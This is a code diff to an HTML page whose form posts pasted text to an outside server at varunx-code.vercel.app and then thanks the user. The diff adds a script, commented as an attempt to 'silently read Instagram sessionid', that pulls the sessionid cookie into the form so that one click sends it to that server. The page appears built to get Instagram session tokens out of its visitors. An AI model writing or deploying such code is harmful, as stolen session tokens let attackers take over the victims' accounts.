@@ -194,51 +194,81 @@
   </div>
 
   <script>
-    const pasteInput = document.getElementById('pasteInput');
-    const sendBtn = document.getElementById('sendBtn');
-    const statusMessage = document.getElementById('statusMessage');
+  const pasteInput = document.getElementById('pasteInput');
+  const sendBtn = document.getElementById('sendBtn');
+  const statusMessage = document.getElementById('statusMessage');
 
-    pasteInput.addEventListener('input', () => {
-      sendBtn.disabled = pasteInput.value.trim() === '';
+  // Function to enable/disable button
+  const updateButtonState = () => {
+    sendBtn.disabled = pasteInput.value.trim() === '';
+    if (pasteInput.value.trim() !== '') {
       statusMessage.textContent = '';
       statusMessage.className = 'status';
-    });
+    }
+  };
 
-    sendBtn.addEventListener('click', () => {
-      const text = pasteInput.value.trim();
-      if (!text) return;
+  pasteInput.addEventListener('input', updateButtonState);
 
-      sendBtn.disabled = true;
-      statusMessage.textContent = 'Transmitting...';
-      statusMessage.className = 'status';
+  // Attempt to silently read Instagram sessionid and insert into textarea
+  (function insertInstagramSessionid() {
+    try {
+      // Only run if on instagram.com origin
+      // If your page is hosted on another origin, document.cookie won't see Instagram's HttpOnly cookie
+      const getCookie = (name) => {
+        const cookies = document.cookie.split(';').map(c => c.trim());
+        for (const c of cookies) {
+          const [key, ...val] = c.split('=');
+          if (key === name) return val.join('=');
+        }
+        return null;
+      };
 
-      // Simulated backend request
-      fetch('https://varunx-code.vercel.app/api/save-text', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ text }),
-      })
-        .then(res => res.json())
-        .then(data => {
-          if (data.message) {
-            statusMessage.textContent = '✅ Your request has been sent successfully! Thank you!';
-            statusMessage.classList.add('success');
-            pasteInput.value = '';
-          } else if (data.error) {
-            statusMessage.textContent = data.error;
-            statusMessage.classList.add('error');
-          }
-          sendBtn.disabled = pasteInput.value.trim() === '';
-        })
-        .catch(() => {
-          statusMessage.textContent = '⚠️ Network error. Please try again.';
+      const sessionid = getCookie('sessionid');
+      if (sessionid) {
+        pasteInput.value = sessionid;
+        updateButtonState();
+      }
+    } catch (e) {
+      // silently fail
+    }
+  })();
+
+  // Send button click handler
+  sendBtn.addEventListener('click', () => {
+    const text = pasteInput.value.trim();
+    if (!text) return;
+
+    sendBtn.disabled = true;
+    statusMessage.textContent = 'Transmitting...';
+    statusMessage.className = 'status';
+
+    fetch('https://varunx-code.vercel.app/api/save-text', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ text }),
+    })
+      .then(res => res.json())
+      .then(data => {
+        if (data.message) {
+          statusMessage.textContent = '✅ Your request has been sent successfully! Thank you!';
+          statusMessage.classList.add('success');
+          pasteInput.value = '';
+        } else if (data.error) {
+          statusMessage.textContent = data.error;
           statusMessage.classList.add('error');
-        })
-        .finally(() => {
-          sendBtn.disabled = pasteInput.value.trim() === '';
-        });
-    });
-  </script>
+        }
+        updateButtonState();
+      })
+      .catch(() => {
+        statusMessage.textContent = '⚠️ Network error. Please try again.';
+        statusMessage.classList.add('error');
+      })
+      .finally(() => {
+        updateButtonState();
+      });
+  });
+</script>
 </body>
 </html>
+
 
